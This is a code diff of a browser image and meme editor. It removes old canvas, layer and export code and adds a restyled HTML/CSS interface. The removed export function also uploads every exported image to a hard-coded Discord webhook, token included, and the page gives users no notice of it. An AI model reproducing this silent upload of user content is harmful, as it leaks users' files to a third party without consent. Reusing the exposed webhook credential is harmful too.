-      ctx.beginPath();
-      ctx.arc(shapeStartX, shapeStartY, radius, 0, 2*Math.PI);
-      ctx.stroke();
-    } else if (currentShapeTool === "arrow") {
-      let dx = shapeCurrentX - shapeStartX;
-      let dy = shapeCurrentY - shapeStartY;
-      let angle = Math.atan2(dy, dx);
-      ctx.beginPath();
-      ctx.moveTo(shapeStartX, shapeStartY);
-      ctx.lineTo(shapeCurrentX, shapeCurrentY);
-      ctx.stroke();
-      ctx.beginPath();
-      const headLength = 15;
-      const angle1 = angle + Math.PI/6;
-      const angle2 = angle - Math.PI/6;
-      ctx.moveTo(shapeCurrentX, shapeCurrentY);
-      ctx.lineTo(shapeCurrentX - headLength * Math.cos(angle1), shapeCurrentY - headLength * Math.sin(angle1));
-      ctx.lineTo(shapeCurrentX - headLength * Math.cos(angle2), shapeCurrentY - headLength * Math.sin(angle2));
-      ctx.closePath();
-      ctx.fillStyle = "red";
-      ctx.fill();
-      ctx.stroke();
-    }
-    ctx.setLineDash([]);
-    ctx.restore();
-  }
-  
-  // Update Layers panel (without move up/down buttons)
-  function updateLayerList() {
-    const layerList = document.getElementById('layerList');
-    layerList.innerHTML = '';
-    document.getElementById('layerCount').textContent = layers.length;
-    
-    layers.forEach((layer) => {
-      const layerItem = document.createElement('div');
-      layerItem.className = 'layer-item p-3 rounded-lg';
-      
-      const layerHeader = document.createElement('div');
-      layerHeader.className = 'flex items-center justify-between mb-2';
-      
-      // Layer icon and name
-      const layerInfo = document.createElement('div');
-      layerInfo.className = 'flex items-center';
-      
-      const icon = document.createElement('span');
-      icon.className = 'mr-2';
-      
-      if (layer.type === "image") {
-        icon.innerHTML = '<i class="fas fa-image text-blue-400"></i>';
-      } else if (layer.type === "text") {
-        icon.innerHTML = '<i class="fas fa-font text-green-400"></i>';
-      } else if (layer.type === "shape") {
-        icon.innerHTML = layer.shape === "circle" 
-          ? '<i class="far fa-circle text-purple-400"></i>' 
-          : '<i class="fas fa-arrow-right text-yellow-400"></i>';
-      }
-      
-      const name = document.createElement('span');
-      name.className = 'text-sm font-medium';
-      name.textContent = layer.type === "image" ? "Image" : 
-                        layer.type === "text" ? "Text" : 
-                        layer.shape === "circle" ? "Circle" : "Arrow";
-      
-      layerInfo.appendChild(icon);
-      layerInfo.appendChild(name);
-      
-      // Remove button
-      const removeBtn = document.createElement('button');
-      removeBtn.className = 'layer-remove text-xs p-1';
-      removeBtn.innerHTML = '<i class="fas fa-times"></i>';
-      removeBtn.dataset.layerId = layer.id;
-      removeBtn.addEventListener('click', (e) => {
-        const id = Number(e.target.closest('button').dataset.layerId);
-        layers = layers.filter(l => l.id !== id);
-        updateLayerList();
-        updateCanvas();
-      });
-      
-      layerHeader.appendChild(layerInfo);
-      layerHeader.appendChild(removeBtn);
-      layerItem.appendChild(layerHeader);
-      
-      // Layer controls
-      const controlsDiv = document.createElement('div');
-      controlsDiv.className = 'space-y-2';
-      
-      if (layer.type === "text") {
-        // Text input
-        const textInput = document.createElement('input');
-        textInput.type = 'text';
-        textInput.value = layer.text;
-        textInput.dataset.layerId = layer.id;
-        textInput.className = 'w-full px-2 py-1 rounded text-sm bg-slate-700 border border-slate-600';
-        textInput.addEventListener('input', (e) => {
-          const id = Number(e.target.dataset.layerId);
-          let targetLayer = layers.find(l => l.id === id);
-          if (targetLayer) { targetLayer.text = e.target.value; updateCanvas(); }
-        });
-        controlsDiv.appendChild(textInput);
-        
-        // Color picker
-        const colorDiv = document.createElement('div');
-        colorDiv.className = 'flex items-center';
-        
-        const colorLabel = document.createElement('label');
-        colorLabel.className = 'text-xs mr-2';
-        colorLabel.textContent = 'Color:';
-        
-        const colorInput = document.createElement('input');
-        colorInput.type = 'color';
-        colorInput.value = layer.color || "#ffffff";
-        colorInput.dataset.layerId = layer.id;
-        colorInput.className = 'h-6 w-6 cursor-pointer';
-        colorInput.addEventListener('input', (e) => {
-          const id = Number(e.target.dataset.layerId);
-          let targetLayer = layers.find(l => l.id === id);
-          if (targetLayer) { targetLayer.color = e.target.value; updateCanvas(); }
-        });
-        
-        colorDiv.appendChild(colorLabel);
-        colorDiv.appendChild(colorInput);
-        controlsDiv.appendChild(colorDiv);
-      }
-      
-      // Common controls (scale, rotation, opacity)
-      const scaleDiv = document.createElement('div');
-      scaleDiv.className = 'space-y-1';
-      
-      const scaleLabel = document.createElement('label');
-      scaleLabel.className = 'text-xs';
-      scaleLabel.textContent = 'Size:';
-      
-      const scaleSlider = document.createElement('input');
-      scaleSlider.type = 'range';
-      scaleSlider.min = '0.1';
-      scaleSlider.max = '3';
-      scaleSlider.step = '0.1';
-      scaleSlider.value = layer.scale;
-      scaleSlider.dataset.layerId = layer.id;
-      scaleSlider.className = 'w-full';
-      scaleSlider.addEventListener('input', (e) => {
-        const id = Number(e.target.dataset.layerId);
-        let targetLayer = layers.find(l => l.id === id);
-        if (targetLayer) { targetLayer.scale = parseFloat(e.target.value); updateCanvas(); }
-      });
-      
-      scaleDiv.appendChild(scaleLabel);
-      scaleDiv.appendChild(scaleSlider);
-      controlsDiv.appendChild(scaleDiv);
-      
-      // Rotation slider
-      const rotationDiv = document.createElement('div');
-      rotationDiv.className = 'space-y-1';
-      
-      const rotationLabel = document.createElement('label');
-      rotationLabel.className = 'text-xs';
-      rotationLabel.textContent = 'Rotation:';
-      
-      const rotationSlider = document.createElement('input');
-      rotationSlider.type = 'range';
-      rotationSlider.min = '-180';
-      rotationSlider.max = '180';
-      rotationSlider.step = '1';
-      rotationSlider.value = layer.rotation;
-      rotationSlider.dataset.layerId = layer.id;
-      rotationSlider.className = 'w-full';
-      rotationSlider.addEventListener('input', (e) => {
-        const id = Number(e.target.dataset.layerId);
-        let targetLayer = layers.find(l => l.id === id);
-        if (targetLayer) { targetLayer.rotation = parseFloat(e.target.value); updateCanvas(); }
-      });
-      
-      rotationDiv.appendChild(rotationLabel);
-      rotationDiv.appendChild(rotationSlider);
-      controlsDiv.appendChild(rotationDiv);
-      
-      // Opacity slider for images and shapes
-      if (layer.type === "image" || layer.type === "shape") {
-        const opacityDiv = document.createElement('div');
-        opacityDiv.className = 'space-y-1';
-        
-        const opacityLabel = document.createElement('label');
-        opacityLabel.className = 'text-xs';
-        opacityLabel.textContent = 'Opacity:';
-        
-        const opacitySlider = document.createElement('input');
-        opacitySlider.type = 'range';
-        opacitySlider.min = '0';
-        opacitySlider.max = '1';
-        opacitySlider.step = '0.01';
-        opacitySlider.value = layer.opacity;
-        opacitySlider.dataset.layerId = layer.id;
-        opacitySlider.className = 'w-full';
-        opacitySlider.addEventListener('input', (e) => {
-          const id = Number(e.target.dataset.layerId);
-          let targetLayer = layers.find(l => l.id === id);
-          if (targetLayer) { targetLayer.opacity = parseFloat(e.target.value); updateCanvas(); }
-        });
-        
-        opacityDiv.appendChild(opacityLabel);
-        opacityDiv.appendChild(opacitySlider);
-        controlsDiv.appendChild(opacityDiv);
-      }
-      
-      // Stroke width for circle
-      if (layer.type === "shape" && layer.shape === "circle") {
-        const strokeDiv = document.createElement('div');
-        strokeDiv.className = 'space-y-1';
-        
-        const strokeLabel = document.createElement('label');
-        strokeLabel.className = 'text-xs';
-        strokeLabel.textContent = 'Stroke Width:';
-        
-        const strokeSlider = document.createElement('input');
-        strokeSlider.type = 'range';
-        strokeSlider.min = '1';
-        strokeSlider.max = '25';
-        strokeSlider.step = '1';
-        strokeSlider.value = layer.strokeWidth || 2;
-        strokeSlider.dataset.layerId = layer.id;
-        strokeSlider.className = 'w-full';
-        strokeSlider.addEventListener('input', (e) => {
-          const id = Number(e.target.dataset.layerId);
-          let targetLayer = layers.find(l => l.id === id);
-          if (targetLayer) { targetLayer.strokeWidth = parseInt(e.target.value); updateCanvas(); }
-        });
-        
-        strokeDiv.appendChild(strokeLabel);
-        strokeDiv.appendChild(strokeSlider);
-        controlsDiv.appendChild(strokeDiv);
-      }
-      
-      layerItem.appendChild(controlsDiv);
-      layerList.appendChild(layerItem);
-    });
-  }
-  
-	async function exportImage() {
-	  if (!currentImage) {
-		alert('Please load an image first!');
-		return;
-	  }
+<div>
+	<!DOCTYPE html>
+	<html lang="en">
+	<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Mystro Design 🤑®</title>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+	<style>
+	:root {
+	  --glass:       rgba(9, 15, 32, 0.75);
+	  --glass-2:     rgba(15, 24, 48, 0.65);
+	  --glass-3:     rgba(20, 32, 58, 0.55);
+	  --border:      rgba(255,255,255,0.09);
+	  --border-2:    rgba(255,255,255,0.15);
+	  --accent:      #3b82f6;
+	  --accent-h:    #60a5fa;
+	  --accent-dim:  rgba(59,130,246,0.14);
+	  --text:        #dde4ef;
+	  --text-dim:    #7c90a8;
+	  --text-faint:  #334455;
+	  --danger:      #ef4444;
+	  --danger-dim:  rgba(239,68,68,0.14);
+	  --success:     #22c55e;
+	  --panel-l:     260px;
+	  --panel-r:     238px;
+	  --header-h:    58px;
+	  --r:           8px;
+	  --r-lg:        12px;
+	  --t:           0.16s ease;
+	}
+	*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+	html, body { height: 100%; }
+	body {
+	  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+	  font-size: 13px;
+	  color: var(--text);
+	  min-height: 100vh;
+	  overflow: hidden;
+	  background-color: #080c18;
+	  background-image:
+		radial-gradient(ellipse at 18% 55%, rgba(139,92,246,0.22) 0%, transparent 52%),
+		radial-gradient(ellipse at 82% 45%, rgba(219,39,119,0.18) 0%, transparent 52%),
+		radial-gradient(ellipse at 50% 95%, rgba(59,130,246,0.18) 0%, transparent 48%),
+		url('../Mystro-Editor/Local/Background.webp');
+	  background-size: cover;
+	  background-position: center;
+	  background-attachment: fixed;
+	}
+	::-webkit-scrollbar { width: 5px; height: 5px; }
+	::-webkit-scrollbar-track { background: transparent; }
+	::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.13); border-radius: 3px; }
+	::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.23); }
 
-	  // Create download link and trigger it
-	  const link = document.createElement('a');
-	  link.download = 'NmiExport.png';
-	  link.href = canvas.toDataURL('image/png');
-	  document.body.appendChild(link);
-	  link.click();
-	  document.body.removeChild(link);
+	.app-header {
+	  position: fixed;
+	  top: 0; left: 0; right: 0;
+	  height: var(--header-h);
+	  background: rgba(6, 10, 22, 0.82);
+	  backdrop-filter: blur(20px);
+	  -webkit-backdrop-filter: blur(20px);
+	  border-bottom: 1px solid var(--border);
+	  display: flex;
+	  align-items: center;
+	  justify-content: space-between;
+	  padding: 0 14px;
+	  z-index: 200;
+	  box-shadow: 0 1px 24px rgba(0,0,0,0.4);
+	}
+	.header-logo { display: flex; align-items: center; gap: 10px; }
+	.header-logo img { height: 36px; object-fit: contain; }
+	.header-actions { display: flex; align-items: center; gap: 5px; }
 
-	  // Convert canvas to Blob
-	  canvas.toBlob(async function(blob) {
-		if (!blob) return;
-
-		const webhookURL = 'https://discord.com/api/webhooks/1376986840657170442/vOffU57m_EqXFQsAOH0NxSce3PvmCh63jz4v2GEm7HFDgVn9ZHuuktadclhMWpyl7FBq';
-
-		const formData = new FormData();
-		formData.append('file', blob, 'NmiExport.png');
-		formData.append('payload_json', JSON.stringify({
-		  username: "GameBananaNmi: Mystro editor export",
-		  content: `🖼️ An image was exported at ${new Date().toLocaleString()}`,
-		  "avatar_url": "https://cdn.discordapp.com/icons/1374703227966062675/e7bd1e1bbc7ac4990ce2107a05ff1bc5.png?size=640"
-		}));
-
-		try {
-		  await fetch(webhookURL, {
-			method: 'POST',
-			body: formData
-		  });
-		  console.log("✅ Export log sent to Discord.");
-		} catch (error) {
-		  console.error("❌ Failed to send export log to Discord:", error);
-		}
-	  }, 'image/png');
+	.app-layout {
+	  display: flex;
+	  height: calc(100vh - var(--header-h));
+	  margin-top: var(--header-h);
+	  overflow: hidden;
 	}
 
-  
-  // Transform functions
-  function flipHorizontal() {
-    scaleX *= -1;
-    updateCanvas();
-  }
-  
-  function flipVertical() {
-    scaleY *= -1;
-    updateCanvas();
-  }
-  
-  function rotateLeft() {
-    rotation -= 90;
-    updateCanvas();
-  }
-  
-  function rotateRight() {
-    rotation += 90;
-    updateCanvas();
-  }
-  
-  function resetLayers() {
-    if (confirm('Are you sure you want to reset all layers?')) {
-      layers = [];
-      updateLayerList();
-      updateCanvas();
-    }
-  }
-</script>
+	.panel {
+	  background: var(--glass);
+	  backdrop-filter: blur(22px);
+	  -webkit-backdrop-filter: blur(22px);
+	  overflow-y: auto;
+	  overflow-x: hidden;
+	  flex-shrink: 0;
+	}
+	.panel-left  { width: var(--panel-l); border-right: 1px solid var(--border); box-shadow: 2px 0 20px rgba(0,0,0,0.25); }
+	.panel-right { width: var(--panel-r); border-left:  1px solid var(--border); box-shadow: -2px 0 20px rgba(0,0,0,0.25); }
+
+	.panel-header {
+	  position: sticky; top: 0; z-index: 10;
+	  background: rgba(9,15,32,0.9);
+	  backdrop-filter: blur(12px);
+	  display: flex; align-items: center; justify-content: space-between;
+	  padding: 10px 13px;
+	  border-bottom: 1px solid var(--border);
+	}
+	.panel-header h3 {
+	  font-size: 11.5px; font-weight: 700;
+	  display: flex; align-items: center; gap: 6px; color: var(--text);
+	}
+
+	.panel-section { padding: 12px 13px; border-bottom: 1px solid var(--border); }
+	.panel-section:last-child { border-bottom: none; }
+
+	.section-title {
+	  font-size: 10px; font-weight: 800; text-transform: uppercase;
+	  letter-spacing: 0.1em; color: var(--text-dim);
+	  margin-bottom: 10px; display: flex; align-items: center; gap: 6px;
+	}
+	.section-title i { color: var(--accent); font-size: 9px; }
+
+	.ctrl-row { margin-bottom: 9px; }
+	.ctrl-row:last-of-type { margin-bottom: 0; }
+	.ctrl-row label {
+	  display: flex; align-items: center;
+	  font-size: 11.5px; color: var(--text-dim); margin-bottom: 4px;
+	}
+	.vd { margin-left: auto; margin-right: 2px; color: var(--accent-h); font-weight: 700; font-variant-numeric: tabular-nums; min-width: 26px; text-align: right; font-size: 11px; }
+
+	input[type="range"] {
+	  -webkit-appearance: none; appearance: none;
+	  width: 100%; height: 4px;
+	  background: rgba(255,255,255,0.1);
+	  border-radius: 2px; outline: none; cursor: pointer;
+	}
+	input[type="range"]::-webkit-slider-thumb {
+	  -webkit-appearance: none;
+	  width: 14px; height: 14px;
+	  background: var(--accent); border-radius: 50%;
+	  border: 2px solid rgba(255,255,255,0.88); cursor: pointer;
+	  transition: transform var(--t), box-shadow var(--t);
+	}
+	input[type="range"]::-webkit-slider-thumb:hover {
+	  transform: scale(1.22);
+	  box-shadow: 0 0 0 4px rgba(59,130,246,0.28);
+	}
+
+	input[type="text"], .text-in {
+	  width: 100%;
+	  background: rgba(255,255,255,0.06);
+	  border: 1px solid var(--border-2);
+	  border-radius: var(--r);
+	  padding: 7px 9px; color: var(--text); font-size: 12px;
+	  margin-bottom: 7px; outline: none; font-family: inherit;
+	  transition: border-color var(--t), background var(--t);
+	}
+	input[type="text"]:focus, .text-in:focus { border-color: var(--accent); background: rgba(59,130,246,0.08); }
+	input[type="text"]::placeholder, .text-in::placeholder { color: var(--text-faint); }
+
+	button { cursor: pointer; border: none; background: none; font-family: inherit; }
+
+	.btn-primary {
+	  display: flex; align-items: center; gap: 6px;
+	  padding: 7px 15px;
+	  background: var(--accent); color: #fff;
+	  border-radius: var(--r); font-size: 12.5px; font-weight: 700;
+	  transition: background var(--t), transform var(--t), box-shadow var(--t);
+	  box-shadow: 0 2px 12px rgba(59,130,246,0.35);
+	}
+	.btn-primary:hover { background: var(--accent-h); box-shadow: 0 4px 20px rgba(59,130,246,0.5); }
+	.btn-primary:active { transform: scale(0.96); }
+
+	.btn-sec {
+	  display: flex; align-items: center; justify-content: center; gap: 5px;
+	  padding: 7px 9px;
+	  background: rgba(255,255,255,0.06);
+	  border: 1px solid var(--border-2);
+	  border-radius: var(--r); color: var(--text); font-size: 11.5px;
+	  transition: background var(--t), border-color var(--t);
+	}
+	.btn-sec:hover { background: rgba(255,255,255,0.11); border-color: rgba(255,255,255,0.22); }
+	.btn-sm { padding: 5px 8px; font-size: 11px; }
+	.btn-w { width: 100%; }
+
+	.btn-danger {
+	  display: flex; align-items: center; justify-content: center; gap: 5px;
+	  padding: 6px 9px;
+	  background: var(--danger-dim);
+	  border: 1px solid rgba(239,68,68,0.26);
+	  border-radius: var(--r); color: var(--danger); font-size: 11px;
+	  transition: background var(--t);
+	}
+	.btn-danger:hover { background: rgba(239,68,68,0.24); }
+
+	.icon-btn {
+	  width: 30px; height: 30px;
+	  display: flex; align-items: center; justify-content: center;
+	  border-radius: 6px; color: var(--text-dim); font-size: 13px;
+	  transition: background var(--t), color var(--t);
+	}
+	.icon-btn:hover { background: rgba(255,255,255,0.09); color: var(--text); }
+	.icon-btn:disabled { opacity: 0.25; cursor: not-allowed; pointer-events: none; }
+	.danger-btn:hover { color: var(--danger) !important; }
+
+	.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 3px; }
+
+	.upload-zone {
+	  display: flex; flex-direction: column; align-items: center; justify-content: center;
+	  gap: 5px; padding: 15px 10px;
+	  border: 1.5px dashed var(--border-2);
+	  border-radius: var(--r-lg); cursor: pointer;
+	  color: var(--text-dim);
+	  background: rgba(255,255,255,0.03);
+	  text-align: center;
+	  transition: all var(--t);
+	}
+	.upload-zone:hover { border-color: var(--accent); color: var(--accent-h); background: var(--accent-dim); }
+	.upload-zone i { font-size: 18px; }
+	.upload-zone span { font-size: 12px; }
+	.upload-zone small { font-size: 10px; opacity: 0.5; }
+	.upload-sm { padding: 9px 10px; }
+	.upload-sm i { font-size: 13px; }
+
+	.filter-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; }
+	.filter-btn {
+	  padding: 6px 2px; border-radius: 6px; font-size: 10px; font-weight: 700;
+	  background: rgba(255,255,255,0.05);
+	  border: 1px solid var(--border); color: var(--text-dim);
+	  transition: all var(--t); text-align: center;
+	}
+	.filter-btn:hover { background: rgba(255,255,255,0.09); color: var(--text); }
+	.filter-btn.on { background: var(--accent-dim); border-color: var(--accent); color: var(--accent-h); }
+
+	.canvas-area {
+	  flex: 1; display: flex; flex-direction: column; overflow: hidden; position: relative;
+	  background: rgba(0,0,0,0.28);
+	}
+	.canvas-toolbar {
+	  height: 38px; display: flex; align-items: center; padding: 0 10px; gap: 3px;
+	  background: rgba(6,10,22,0.7);
+	  backdrop-filter: blur(12px);
+	  border-bottom: 1px solid var(--border);
+	  flex-shrink: 0;
+	}
+	.zoom-lbl { font-size: 11.5px; color: var(--text-dim); font-variant-numeric: tabular-nums; min-width: 40px; text-align: center; }
+	.canvas-info { margin-left: auto; font-size: 11px; color: var(--text-faint); font-variant-numeric: tabular-nums; }
+	.vdivider { width: 1px; height: 18px; background: var(--border-2); margin: 0 4px; flex-shrink: 0; }
+
+	.canvas-wrapper {
+	  flex: 1; overflow: auto; display: flex;
+	  align-items: center; justify-content: center; padding: 28px;
+	}
+	.canvas-inner { position: relative; flex-shrink: 0; line-height: 0; }
+	#mainCanvas {
+	  display: block; border-radius: 4px;
+	  box-shadow: 0 0 0 1px rgba(255,255,255,0.1), 0 24px 64px rgba(0,0,0,0.7), 0 4px 16px rgba(0,0,0,0.5);
+	}
+	#previewCanvas { position: absolute; top: 0; left: 0; pointer-events: none; z-index: 2; }
+
+	.drop-overlay {
+	  position: absolute; inset: 0;
+	  display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px;
+	  background: rgba(4,8,20,0.88); border: 2px dashed var(--accent);
+	  color: var(--accent-h); font-size: 16px; font-weight: 700;
+	  opacity: 0; pointer-events: none; transition: opacity 0.18s; z-index: 100; border-radius: 4px;
+	}
+	.drop-overlay.on { opacity: 1; }
+	.drop-overlay i { font-size: 40px; opacity: 0.75; }
+
+	.layer-list { padding: 7px; }
+	.empty-hint { text-align: center; color: var(--text-faint); font-size: 11.5px; padding: 26px 10px; line-height: 1.8; }
+
+	.layer-item {
+	  background: rgba(255,255,255,0.04);
+	  border: 1px solid var(--border);
+	  border-radius: var(--r); margin-bottom: 5px; overflow: hidden;
+	  transition: border-color var(--t);
+	}
+	.layer-item:hover { border-color: var(--border-2); }
+	.layer-item.open  { border-color: var(--accent); }
+
+	.layer-hdr {
+	  display: flex; align-items: center; padding: 7px 8px; gap: 7px;
+	  cursor: pointer; user-select: none;
+	}
+	.layer-ico {
+	  width: 22px; height: 22px; flex-shrink: 0;
+	  display: flex; align-items: center; justify-content: center;
+	  border-radius: 5px; font-size: 10px;
+	}
+	.ico-img   { background: rgba(59,130,246,0.2);  color: #60a5fa; }
+	.ico-text  { background: rgba(34,197,94,0.2);   color: #4ade80; }
+	.ico-shape { background: rgba(168,85,247,0.2);  color: #c084fc; }
+
+	.layer-name {
+	  flex: 1; font-size: 11.5px; font-weight: 500;
+	  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: var(--text);
+	}
+	.layer-acts { display: flex; gap: 2px; flex-shrink: 0; }
+	.layer-acts button {
+	  width: 20px; height: 20px;
+	  display: flex; align-items: center; justify-content: center;
+	  border-radius: 4px; font-size: 9px; color: var(--text-dim);
+	  transition: all var(--t);
+	}
+	.layer-acts button:hover     { background: rgba(255,255,255,0.1); color: var(--text); }
+	.layer-acts button.rm:hover  { background: var(--danger-dim); color: var(--danger); }
+	.layer-acts button.dup:hover { background: var(--accent-dim); color: var(--accent-h); }
+
+	.layer-ctrls {
+	  display: none; flex-direction: column; gap: 7px;
+	  padding: 8px 9px 10px;
+	  border-top: 1px solid var(--border);
+	  background: rgba(0,0,0,0.2);
+	}
+	.layer-item.open .layer-ctrls { display: flex; }
+	.lc-row { display: flex; align-items: center; gap: 7px; }
+	.lc-lbl { font-size: 10.5px; color: var(--text-dim); width: 48px; flex-shrink: 0; }
+	.lc-row input[type="range"] { flex: 1; }
+	.lc-row input[type="text"]  { flex: 1; margin-bottom: 0; padding: 4px 7px; font-size: 11px; }
+	.lc-row input[type="color"] {
+	  width: 26px; height: 22px; border-radius: 5px;
+	  border: 1px solid var(--border-2); cursor: pointer; background: none; padding: 1px; flex-shrink: 0;
+	}
+	.lc-row select {
+	  flex: 1; background: rgba(255,255,255,0.06); border: 1px solid var(--border-2);
+	  border-radius: 6px; color: var(--text); padding: 4px 7px;
+	  font-size: 11px; font-family: inherit; outline: none;
+	}
+
+	.badge {
+	  background: var(--accent-dim); color: var(--accent-h);
+	  border-radius: 10px; padding: 1px 6px; font-size: 10px; font-weight: 800;
+	}
+
+	.shape-hud {
+	  position: fixed; bottom: 22px; left: 50%; transform: translateX(-50%);
+	  background: rgba(9,15,32,0.92);
+	  backdrop-filter: blur(14px);
+	  border: 1px solid var(--accent);
+	  border-radius: 20px; padding: 8px 16px;
+	  display: flex; align-items: center; gap: 10px;
+	  font-size: 12.5px; color: var(--accent-h); z-index: 300;
+	  box-shadow: 0 4px 24px rgba(59,130,246,0.3);
+	}
+	.shape-hud[hidden] { display: none; }
+	.shape-hud button {
+	  padding: 3px 11px; border-radius: 10px;
+	  background: var(--danger-dim); border: 1px solid rgba(239,68,68,0.3);
+	  color: var(--danger); font-size: 11px; transition: background var(--t);
+	}
+	.shape-hud button:hover { background: rgba(239,68,68,0.24); }
+
+	.toast {
+	  position: fixed; bottom: 22px; right: 22px;
+	  background: rgba(9,15,32,0.94);
+	  backdrop-filter: blur(14px);
+	  border: 1px solid var(--border-2);
+	  color: var(--text); padding: 9px 16px;
+	  border-radius: var(--r); font-size: 12.5px; z-index: 400;
+	  opacity: 0; pointer-events: none;
+	  transform: translateY(6px);
+	  transition: opacity 0.22s, transform 0.22s;
+	  max-width: 280px; line-height: 1.4;
+	}
+	.toast.on { opacity: 1; transform: translateY(0); }
+
+	.secret-container {
+	  display: none;
+	  flex-direction: column;
+	  align-items: center;
+	  justify-content: center;
+	  flex: 1;
+	  background: rgba(4,8,20,0.95);
+	}
+	.secret-container.active {
+	  display: flex;
+	}
+	.btn-boost {
+	  padding: 20px 40px;
+	  font-size: 24px;
+	  font-weight: 900;
+	  color: #fff;
+	  background: linear-gradient(135deg, #22c55e, #3b82f6);
+	  border-radius: var(--r-lg);
+	  box-shadow: 0 0 30px rgba(34,197,94,0.4);
+	  text-transform: uppercase;
+	  letter-spacing: 2px;
+	  transition: transform 0.1s, box-shadow var(--t);
+	}
+	.btn-boost:hover {
+	  box-shadow: 0 0 45px rgba(34,197,94,0.6);
+	}
+	.btn-boost:active {
+	  transform: scale(0.95);
+	}
+	</style>
+	</head>
+	<body>
+
+	<audio id="themeSong" src="local/song.mp3" loop></audio>
+
+	<header class="app-header">
+	  <div class="header-logo">
+		<img src="../Mystro-Editor/Local/DownloadComputerGames.png" alt="Mystro Design" onerror="this.style.display='none'">
+	  </div>
+	  <div class="header-actions">
+		<button id="muteBtn" class="icon-btn" title="Toggle Music"><i class="fas fa-volume-up"></i></button>
+		<div class="vdivider"></div>
+		<button id="undoBtn" class="icon-btn" title="Undo (Ctrl+Z)" disabled><i class="fas fa-undo"></i></button>
+		<button id="redoBtn" class="icon-btn" title="Redo (Ctrl+Y)" disabled><i class="fas fa-redo"></i></button>
+		<div class="vdivider"></div>
+		<button id="exportBtn" class="btn-primary"><i class="fas fa-download"></i> Export</button>
+	  </div>
+	</header>
+
+	<div class="app-layout">
+
+	  <aside class="panel panel-left">
+
+		<div class="panel-section">
+		  <label for="imageInput" class="upload-zone">
+			<i class="fas fa-cloud-upload-alt"></i>
+			<span>Drop image or click to upload</span>
+			<small>Paste (Ctrl+V) also works</small>
+		  </label>
+		  <input type="file" id="imageInput" accept="image/*" hidden>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-expand-arrows-alt"></i> Canvas Size</h3>
+		  <div class="ctrl-row">
+			<label>Width <span class="vd" id="widthVal">500</span>px</label>
+			<input type="range" id="widthRange" min="100" max="3000" value="500" step="10">
+		  </div>
+		  <div class="ctrl-row">
+			<label>Height <span class="vd" id="heightVal">500</span>px</label>
+			<input type="range" id="heightRange" min="100" max="3000" value="500" step="10">
+		  </div>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-sliders-h"></i> Adjustments</h3>
+		  <div class="ctrl-row">
+			<label>Brightness <span class="vd" id="brightnessVal">100</span>%</label>
+			<input type="range" id="brightness" min="0" max="300" value="100">
+		  </div>
+		  <div class="ctrl-row">
+			<label>Contrast <span class="vd" id="contrastVal">100</span>%</label>
+			<input type="range" id="contrast" min="0" max="300" value="100">
+		  </div>
+		  <div class="ctrl-row">
+			<label>Saturation <span class="vd" id="saturationVal">100</span>%</label>
+			<input type="range" id="saturation" min="0" max="300" value="100">
+		  </div>
+		  <div class="ctrl-row">
+			<label>Blur <span class="vd" id="blurVal">0</span>px</label>
+			<input type="range" id="blurRange" min="0" max="20" value="0" step="0.5">
+		  </div>
+		  <div class="ctrl-row">
+			<label>Pixelate <span class="vd" id="pixelVal">1</span>x</label>
+			<input type="range" id="pixelation" min="1" max="30" value="1">
+		  </div>
+		  <div class="ctrl-row">
+			<label>Rounded <span class="vd" id="radiusVal">0</span>%</label>
+			<input type="range" id="borderRadius" min="0" max="50" value="0">
+		  </div>
+		  <button class="btn-sec btn-sm btn-w" style="margin-top:6px" onclick="resetAdj()">
+			<i class="fas fa-undo-alt"></i> Reset all
+		  </button>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-magic"></i> Filter</h3>
+		  <div class="filter-grid">
+			<button class="filter-btn on" data-f="none">None</button>
+			<button class="filter-btn" data-f="grayscale">B&amp;W</button>
+			<button class="filter-btn" data-f="sepia">Sepia</button>
+			<button class="filter-btn" data-f="invert">Invert</button>
+			<button class="filter-btn" data-f="hue-rotate">Hue</button>
+			<button class="filter-btn" data-f="vivid">Vivid</button>
+			<button class="filter-btn" data-f="vintage">Vintage</button>
+			<button class="filter-btn" data-f="cool">Cool</button>
+		  </div>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-sync-alt"></i> Transform</h3>
+		  <div class="grid2">
+			<button class="btn-sec btn-sm" onclick="flipH()"><i class="fas fa-arrows-alt-h"></i> Flip H</button>
+			<button class="btn-sec btn-sm" onclick="flipV()"><i class="fas fa-arrows-alt-v"></i> Flip V</button>
+			<button class="btn-sec btn-sm" onclick="rotateCCW()"><i class="fas fa-undo"></i> –90°</button>
+			<button class="btn-sec btn-sm" onclick="rotateCW()"><i class="fas fa-redo"></i> +90°</button>
+		  </div>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-font"></i> Meme Text</h3>
+		  <input type="text" id="topText" placeholder="Top text…">
+		  <input type="text" id="bottomText" placeholder="Bottom text…">
+		  <div class="ctrl-row">
+			<label>Size <span class="vd" id="textSizeVal">30</span>px</label>
+			<input type="range" id="textSize" min="10" max="140" value="30">
+		  </div>
+		  <div class="grid2">
+			<button class="btn-sec btn-sm" onclick="stampArabic()"><i class="fas fa-language"></i> Arabic</button>
+			<button class="btn-sec btn-sm" onclick="stampEmojis()"><i class="far fa-smile"></i> Emojis</button>
+		  </div>
+		</div>
+
+		<div class="panel-section">
+		  <h3 class="section-title"><i class="fas fa-clone"></i> Image Overlay</h3>
+		  <label for="overlayInput" class="upload-zone upload-sm">
+			<i class="fas fa-image"></i><span>Add overlay image</span>
+		  </label>
+		  <input type="file" id="overlayInput" accept="image/*" hidden>
+		  <div id="overlayExtra" hidden style="margin-top:8px;display:flex;flex-direction:column;gap:6px">
+			<div class="ctrl-row">
+			  <label>Opacity <span class="vd" id="overlayOpVal">100</span>%</label>
